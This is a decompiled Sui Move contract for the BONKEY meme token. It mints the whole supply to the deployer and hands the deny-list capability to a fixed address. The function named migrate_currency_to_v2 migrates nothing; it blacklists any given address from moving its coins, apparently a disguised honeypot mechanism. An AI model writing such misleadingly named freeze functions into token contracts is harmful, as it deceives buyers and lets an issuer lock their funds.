module 0x51b80b279016c4619fb647fc04739b921b9f0fae142d8fc0e60c7587a123892b::bonkey {
    struct BONKEY has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<BONKEY>, arg1: 0x2::coin::Coin<BONKEY>) {
        0x2::coin::burn<BONKEY>(arg0, arg1);
    }

    fun init(arg0: BONKEY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BONKEY>(arg0, 9, b"BONKEY", b"BONKEY", x"5468652053756920646567656e20636f6d6d756e69747920776173206d697373696e67207468652077696c6420656e65726779206f6620536f6c616e61277320506f6e6b652e2054686174e280997320776879207468657920636f6e76696e63656420706f6e6b6527732062726f74686572202d20426f6e6b6579202d20746f206a6f696e2074686520726964652e204d6565742074686973206e65772069636f6e696320537569206368617261637465722c20616c6f6e677369646520427265747420616e64206f74686572204d617474204675726965206372656174696f6e73", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/27B5xBq/throwing-money.gif")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BONKEY>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BONKEY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BONKEY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BONKEY>>(v1, @0x9689cb1ea9336c1b282f3e317c6b67b0481256cbbfe043fcddd12aa06d0f147);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BONKEY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BONKEY>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<BONKEY>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<BONKEY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

